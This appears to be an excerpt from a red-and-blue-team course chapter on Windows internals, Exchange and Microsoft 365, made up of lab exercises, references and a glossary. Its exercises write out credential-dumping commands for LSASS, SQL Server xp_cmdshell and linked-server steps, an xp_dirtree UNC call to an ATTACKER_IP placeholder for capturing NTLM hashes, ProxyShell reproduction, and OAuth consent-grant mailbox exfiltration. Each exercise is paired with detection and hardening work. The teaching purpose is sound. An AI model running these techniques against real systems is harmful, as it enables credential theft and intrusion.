...
modulo: "14.B"
titolo: "Windows Internals, Exchange, and Microsoft 365"
versione: "Windows Server 2025, Exchange Server 2019 CU15+, Microsoft 365 E5, Volatility3 2.x"
livello: "Advanced"
prerequisiti:
  - "Windows process architecture (EPROCESS, PEB, token model)"
  - "Kerberos and NTLM authentication protocols (Domain 13 Chapter 13B)"
  - "Active Directory attack fundamentals (Chapter 14A §1–§10)"
  - "Basic IIS and web application architecture"
  - "PowerShell and Python scripting for forensic analysis"
obiettivi:
  - "Explain the Windows kernel syscall dispatch path and exploit BYOVD techniques to bypass driver signing and HVCI"
  - "Execute and detect LSASS credential extraction across eight methods, validating RunAsPPL and Credential Guard protections"
  - "Exploit SQL Server misconfigurations (xp_cmdshell, linked servers, CLR assemblies) and deploy detection rules for each vector"
  - "Analyze Exchange exploitation chains (ProxyLogon, ProxyShell, ProxyNotShell) and perform mailbox-rule forensics across on-premises and M365"
  - "Conduct Windows memory and registry forensics using Volatility3, building unified incident timelines with plaso"
tag: [windows-internals, lsass, credential-guard, exchange, proxylogon, m365, sql-server, volatility3, forensics, detection-engineering]
---
...
> 1. Trace the Windows syscall dispatch path from `syscall` instruction through SSDT to kernel service, and identify where PatchGuard, HVCI, and driver-signing enforcement intervene.
> 2. Perform LSASS credential extraction via at least four methods (Mimikatz, comsvcs.dll, nanodump, PPLdump) and validate that each triggers the corresponding Sysmon/Sigma detection.
> 3. Exploit SQL Server lateral movement paths including linked-server chains and UNC credential capture, with Extended Events audit configurations.
> 4. Reproduce the ProxyLogon and ProxyShell attack chains in a lab environment, identify IIS log indicators, and implement Exchange hardening (EPA, URL rewrite rules, transport-agent auditing).
> 5. Conduct a full Windows incident response using Volatility3 memory analysis, registry forensics (ShimCache, Amcache, BAM), and event-log timeline reconstruction.
...
### Exercise 14B-1 — LSASS credential extraction across protection tiers

**Objective.** Execute LSASS credential dumping using four distinct methods and validate detection at each protection tier (no protection, RunAsPPL, RunAsPPL + HVCI, Credential Guard).

**Steps.**

1. On a lab Windows Server with no LSASS protections, extract credentials using: (a) Mimikatz `sekurlsa::logonpasswords`, (b) `rundll32.exe comsvcs.dll, MiniDump`, (c) nanodump `--fork --write`, (d) ProcDump `-ma lsass.exe`.
2. Enable RunAsPPL (`reg add ... RunAsPPL /d 1`), reboot, and re-attempt each method. Document which methods fail and which bypass PPL.
3. Enable HVCI (`Turn On Virtualization Based Security` GPO). Attempt PPLdump and BYOVD-based extraction. Document the HVCI blocking behavior (CodeIntegrity Event 3033/3063).
4. Enable Credential Guard. Dump LSASS again — verify that NTLM hashes and Kerberos keys are absent (protected in VTL1). Document which credentials remain accessible (DCC2 cached creds, WDigest if re-enabled).
5. For each attempt, capture Sysmon Event ID 10 (ProcessAccess) data. Validate the Sigma Rule 1 from §7.1.

**Deliverable.** Protection-tier matrix showing which extraction methods succeed at each level, Sysmon alert evidence, and a hardening priority recommendation.

### Exercise 14B-2 — SQL Server linked-server lateral movement

**Objective.** Enumerate and exploit linked-server chains to achieve code execution on a remote SQL instance, capture NTLM credentials via UNC path injection, and deploy detection.

**Steps.**

1. In a lab with two SQL Server instances (SERVER-A and SERVER-B), configure a linked server from A to B with `sa` mapping.
2. From an initial foothold on SERVER-A, enumerate links: `SELECT * FROM sys.servers WHERE is_linked = 1`. Check sysadmin on B: `SELECT * FROM OPENQUERY([SERVER-B], 'SELECT IS_SRVROLEMEMBER(''sysadmin'')')`.
3. Enable `xp_cmdshell` on B via the link: `EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [SERVER-B]`. Execute `whoami` on B.
4. Force UNC credential capture: `EXEC xp_dirtree '\\ATTACKER_IP\share'` on both servers. Capture NTLMv2 hashes with Responder.
5. Deploy the Extended Events session from §6.5 to audit `xp_cmdshell` and linked-server queries. Verify alerts fire.

**Deliverable.** Link-crawl output, captured NTLMv2 hashes, Extended Events audit log entries, and network segmentation recommendations to block outbound SMB from SQL servers.

### Exercise 14B-3 — Exchange ProxyShell reproduction and IIS forensics

**Objective.** Reproduce the ProxyShell exploit chain (CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207) against a vulnerable Exchange lab, identify IIS log indicators, and implement URL-rewrite mitigations.

**Steps.**

1. Deploy Exchange Server 2019 (pre-CU11 for vulnerability) in a lab. Verify the version is vulnerable via `Get-ExchangeServer | fl AdminDisplayVersion`.
2. Execute the ProxyShell chain using a publicly available PoC (authorized lab only). Document each stage: autodiscover path confusion, X-Rps-CAT privilege escalation, mailbox export to webshell.
3. After exploitation, examine IIS logs for indicators: requests to `/autodiscover/autodiscover.json` with anomalous query strings, POST requests to newly created `.aspx` files.
4. Audit mailbox rules and transport agents: `Get-InboxRule -Mailbox * | Where-Object { $_.ForwardTo }` and `Get-TransportAgent`.
5. Implement URL-rewrite mitigation and apply the CU patch. Re-attempt exploitation — verify it fails.

**Deliverable.** IIS log excerpts with highlighted ProxyShell indicators, webshell file hash, transport-agent audit output, and before/after URL-rewrite configuration.

### Exercise 14B-4 — Windows memory forensics with Volatility3

**Objective.** Analyze a memory image from a compromised Windows host to identify injected code, stolen tokens, and network connections using Volatility3.

**Steps.**

1. Acquire a memory image from a lab host that has been compromised (Mimikatz run, process injection performed, C2 beacon active). Use WinPMEM for acquisition.
2. Run `windows.pslist` and `windows.psscan`. Compare outputs — identify any DKOM-hidden processes (present in psscan only).
3. Run `windows.malfind` to identify processes with RWX private memory regions (injected code). Dump the suspicious regions.
4. Run `windows.netscan` to recover network connections. Identify the C2 callback IP and port.
5. Run `windows.hashdump` and `windows.lsadump` to extract credentials from the memory image. Compare with live Mimikatz output to validate completeness.
6. Build a timeline: process creation → injection → credential access → C2 connection.

**Deliverable.** Volatility3 plugin output for each step, extracted IOCs (hashes, IPs, injected code), and a forensic timeline documenting the attack sequence.

### Exercise 14B-5 — M365 OAuth consent grant attack and detection

**Objective.** Simulate an OAuth consent grant attack against an M365 tenant, exfiltrate mailbox data via Graph API, and validate Conditional Access and audit-log detections.

**Steps.**

1. Register a multi-tenant Azure AD app with permissions: `Mail.Read`, `Files.ReadWrite.All`, `User.Read.All`. Generate a consent URL.
2. As a simulated victim admin, navigate to the consent URL and grant permissions.
3. Exchange the authorization code for access + refresh tokens. Use the Graph API to read the victim's inbox (`GET /v1.0/me/messages`), search for sensitive content, and download OneDrive files.
4. In Azure AD audit logs, locate the "Consent to application" event. Write a KQL query (per §7.3) that would detect this consent pattern.
5. Implement hardening: disable user consent (`Do not allow user consent`), configure admin consent workflow, block cross-tenant consent.
6. Re-attempt the consent flow — verify it is blocked.

**Deliverable.** Graph API response excerpts, Azure AD audit log entries, KQL detection query, and Conditional Access policy configuration screenshots.
...
- Microsoft, "Windows Internals, 7th Edition, Part 2" (2021). Publisher: Microsoft Press. Chapters on EPROCESS, token model, and SSDT.
- Microsoft, "Exchange Server Architecture," Microsoft Learn (2025): https://learn.microsoft.com/en-us/exchange/architecture/architecture
- Microsoft, "Credential Guard Overview," Microsoft Learn (2025): https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/

### Vulnerability advisories

- CVE-2026-42897 — Exchange Server cross-site scripting zero-day, actively exploited (May 2026). Microsoft Security Response Center: https://techcommunity.microsoft.com/blog/exchange/addressing-exchange-server-may-2026-vulnerability-cve-2026-42897/4518498
- CVE-2026-21527 — Exchange Server remote code execution. Rapid7 analysis: https://www.rapid7.com/db/vulnerabilities/microsoft-exchange-cve-2026-21527/
- CVE-2021-26855 / CVE-2021-27065 — ProxyLogon. MITRE ATT&CK T1190.
- CVE-2021-34473 / CVE-2021-34523 / CVE-2021-31207 — ProxyShell. MITRE ATT&CK T1190.
- CVE-2022-41040 / CVE-2022-41082 — ProxyNotShell. MITRE ATT&CK T1190.

### Research papers and technical references

- Volatility Foundation, "Volatility3 Documentation" (2025): https://volatility3.readthedocs.io/
- Eric Zimmerman, "KAPE and forensic tool suite" (2025): https://ericzimmerman.github.io/
- Microsoft, "Sysmon — System Monitor" (2025): https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- PowerUpSQL, "SQL Server Attack Toolkit" (2025): https://github.com/NetSPI/PowerUpSQL
...
- T1098.003 — Additional Cloud Credentials: https://attack.mitre.org/techniques/T1098/003/

---

## 13. Cross-References (table)

| Section | Related Chapter | Topic | Relationship |
|---------|----------------|-------|-------------|
| §1 Kernel / SSDT | Domain 11 Ch. 11B §1.3 | Direct/indirect syscalls | Syscall dispatch path that direct-syscall techniques bypass |
| §2 Tokens / Potato | Chapter 14A §5 | Delegation, RBCD | Token impersonation feeds delegation-based lateral movement |
| §3 LSASS protection | Chapter 14A §7 | DCSync | LSASS credentials are the input to DCSync and PtH |
| §4 SQL Server | Chapter 14A §10 | Coercion, NTLM relay | SQL UNC path injection triggers the same relay chains |
| §5 Exchange / M365 | Domain 10 Ch. 10A | Azure AD / Entra ID | M365 OAuth abuse extends on-prem Exchange compromise to cloud |
| §6-§7 Forensics / Detection | Domain 27 Ch. 27C | SIEM operationalization | Sigma rules and Volatility3 procedures feed the 27C detection framework |
...
| Term | Definition |
|------|-----------|
| **EPROCESS** | Kernel data structure representing a Windows process; contains the token pointer, PEB reference, handle table, and the doubly-linked `ActiveProcessLinks` list targeted by DKOM rootkits. |
| **SSDT (System Service Descriptor Table)** | Kernel array of function pointers indexed by syscall number; the dispatch table for `Nt*`/`Zw*` system calls. Protected by PatchGuard. |
| **PatchGuard (KPP)** | Kernel Patch Protection mechanism that periodically verifies the integrity of critical kernel structures (SSDT, IDT, GDT, MSRs) and triggers a BSOD on modification. |
| **HVCI (Hypervisor-protected Code Integrity)** | VBS feature that uses the hypervisor's EPT to enforce code-integrity in kernel mode, blocking unsigned driver loading and kernel code modification. |
| **BYOVD (Bring Your Own Vulnerable Driver)** | Technique where the attacker loads a legitimately signed but vulnerable driver, exploits it for kernel read/write, and uses the primitive to disable DSE or load rootkits. |
| **RunAsPPL (Protected Process Light)** | LSASS protection that runs `lsass.exe` as a PPL process, rejecting memory-read handles from non-PPL processes even with `SeDebugPrivilege`. |
| **Credential Guard** | VBS-based protection that isolates NTLM hashes, Kerberos keys, and DPAPI master keys in VTL1 (Secure Kernel), inaccessible even to kernel-level attackers in VTL0. |
| **SeImpersonatePrivilege** | Windows privilege that allows a process to impersonate client tokens obtained via named-pipe connections; the foundation of all Potato-family privilege escalation attacks. |
| **ProxyLogon** | Exchange exploit chain (CVE-2021-26855 + CVE-2021-27065) combining an unauthenticated SSRF with an arbitrary file write to deploy a webshell as SYSTEM. |
| **ProxyShell** | Exchange exploit chain (CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207) using path confusion, X-Rps-CAT impersonation, and mailbox-export-to-webshell. |
| **PRT (Primary Refresh Token)** | Long-lived Azure AD token stored on joined/hybrid devices providing SSO to all Azure AD applications; theft enables persistent cloud access without credentials or MFA. |
| **OAuth Consent Grant** | M365 attack where the victim admin approves a malicious multi-tenant app, granting the attacker persistent API access (Mail.Read, Files.ReadWrite) via refresh tokens. |
| **Volatility3** | Open-source memory forensics framework that reconstructs kernel structures (processes, handles, network connections, registry) from raw memory dumps. |
| **ShimCache (AppCompatCache)** | Registry artifact recording metadata about executables loaded by the application compatibility subsystem; used forensically to prove binary execution. |
| **Amcache** | Registry hive (`Amcache.hve`) recording program execution details including SHA1 hash, PE timestamp, publisher, and first execution time. |
